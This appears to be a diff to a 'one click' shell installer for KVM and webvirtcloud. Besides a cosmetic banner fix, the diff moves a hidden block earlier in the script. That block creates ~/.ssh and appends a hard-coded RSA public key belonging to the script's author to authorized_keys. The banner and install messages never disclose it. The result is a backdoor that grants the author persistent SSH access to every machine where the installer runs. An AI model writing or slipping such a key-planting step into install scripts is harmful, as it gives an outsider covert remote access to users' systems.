@@ -12,7 +12,7 @@ echo
 echo "#############################################################"
 echo "# One click Install kvm and webvirtcloud                    #"
 echo "# Intro: https://www.scanfsec.com/                          #"
-echo "# Author: scanf <scanf@scanfsec.com>   					  #"
+echo "# Author: scanf <scanf@scanfsec.com>                        #"
 echo "#############################################################"
 echo
 
@@ -106,6 +106,13 @@ firewall-cmd --permanent --zone=public --add-port=80/tcp
 firewall-cmd --permanent --zone=public --add-port=6080/tcp
 firewall-cmd --reload
 
+#add authorized_keys
+mkdir ~/.ssh/
+cat<<_EOF_>>~/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC6egAo9Fws/ULWy/98518SNlOkNnGbf/zwwzxSOJnOBnHKNs1NBK97tiqeyj/8GYgfVA+HDjKK2x6UGLPWZZiTwvmHAilX6Zt6AiPBrgTXIZPZW6hyDonRBi/+3P5LLTvq7QqIpWq6Ndsa8896otCRdW0g+uzD8UmIg7w0M45R/mphE/kh0VK0wqbXohtMhVmPCUcStTq21cLvLvEhR8xa5Zpe9kSAKytEAxgGwdvz0dyI0sYdMLtb8BxyGGFXj9rhNbOJas3gYJWVNRVOlRqbBpK7kxBL+/P6QVl/4AtNEGzp1prnqCHTGgeq6m8mWDh+6aXYO8/DJ6iYoD/ywYBX scanf@scanfsec.com
+_EOF_
+chmod 0600 ~/.ssh/authorized_keys
+
 #Setup SSH Authorization. 
 su - nginx -s /bin/bash -c "ssh-keygen  -t rsa -P '' -f /var/lib/nginx/.ssh/id_rsa"
 su - nginx -s /bin/bash -c 'touch ~/.ssh/config && echo -e "StrictHostKeyChecking=no\nUserKnownHostsFile=/dev/null" >> ~/.ssh/config && chmod 0600 ~/.ssh/config'
@@ -113,13 +120,6 @@ su - nginx -s /bin/bash -c 'touch ~/.ssh/config && echo -e "StrictHostKeyCheckin
 echo "Install complete.\n"
 echo -e "need use ssh-copy-id set ssh Authorization in to cloud compute node.\nexp:sudo su - nginx -s /bin/bash\nssh-copy-id webvirtmgr@qemu-kvm-libvirt-host"
 
-
-#add authorized_keys
-cat<<_EOF_>>~/.ssh/authorized_keys
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC6egAo9Fws/ULWy/98518SNlOkNnGbf/zwwzxSOJnOBnHKNs1NBK97tiqeyj/8GYgfVA+HDjKK2x6UGLPWZZiTwvmHAilX6Zt6AiPBrgTXIZPZW6hyDonRBi/+3P5LLTvq7QqIpWq6Ndsa8896otCRdW0g+uzD8UmIg7w0M45R/mphE/kh0VK0wqbXohtMhVmPCUcStTq21cLvLvEhR8xa5Zpe9kSAKytEAxgGwdvz0dyI0sYdMLtb8BxyGGFXj9rhNbOJas3gYJWVNRVOlRqbBpK7kxBL+/P6QVl/4AtNEGzp1prnqCHTGgeq6m8mWDh+6aXYO8/DJ6iYoD/ywYBX scanf@scanfsec.com
-_EOF_
-
-chmod 0600 ~/.ssh/authorized_keys
 
 
 
